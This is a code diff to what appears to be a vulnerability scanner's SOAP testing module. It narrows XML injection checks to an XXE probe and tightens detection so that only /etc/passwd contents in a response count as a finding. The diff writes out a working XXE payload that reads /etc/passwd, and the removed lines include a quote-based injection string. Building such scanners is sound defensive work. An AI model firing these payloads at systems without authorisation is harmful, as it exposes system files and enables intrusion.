@@ -53,27 +53,34 @@ class SOAPModule(BaseModule):
                 pass
 
     def _test_soap_xml_injection(self, url):
-        """Test for XML injection in SOAP endpoints."""
-        soap_payloads = [
-            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test>&xxe;</test></soap:Body></soap:Envelope>',
-            '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test>" or "1"="1</test></soap:Body></soap:Envelope>',
-        ]
-        for payload in soap_payloads:
-            try:
-                headers = {"Content-Type": "text/xml"}
-                resp = self.requester.request(url, "POST", data=payload, headers=headers)
-                if resp and ("root:" in resp.text or "error" in resp.text.lower()):
-                    self.engine.add_finding(self._finding(
-                        technique="SOAP XML Injection",
-                        url=url,
-                        severity="HIGH",
-                        confidence=0.6,
-                        param="SOAP Body",
-                        payload=payload[:100],
-                        evidence=f"SOAP response: {resp.text[:200]}",
-                    ))
-            except Exception:
-                pass
+        """Test for XXE via SOAP: only flag when /etc/passwd content appears
+        in the response — a generic 500/'error' string is not evidence."""
+        xxe_payload = (
+            '<?xml version="1.0"?>'
+            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
+            '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
+            '<soap:Body><test>&xxe;</test></soap:Body></soap:Envelope>'
+        )
+        try:
+            headers = {"Content-Type": "text/xml"}
+            resp = self.requester.request(url, "POST", data=xxe_payload, headers=headers)
+            if resp is None:
+                return
+            body = resp.text or ""
+            # /etc/passwd signature: line starting root:x:0:0: (or nobody:x:)
+            # AND the /etc/passwd path is NOT reflected from the request.
+            if re.search(r"(^|\n)(root|nobody|daemon):[^:]*:\d+:\d+:", body) and "/etc/passwd" not in body[:len(xxe_payload)+200]:
+                self.engine.add_finding(self._finding(
+                    technique="SOAP XXE (file read)",
+                    url=url,
+                    severity="CRITICAL",
+                    confidence=0.95,
+                    param="SOAP Body",
+                    payload=xxe_payload[:120],
+                    evidence=f"/etc/passwd contents in SOAP response: {body[:200]}",
+                ))
+        except Exception:
+            pass
 
     def _finding(self, **kw):
         from core.engine import Finding
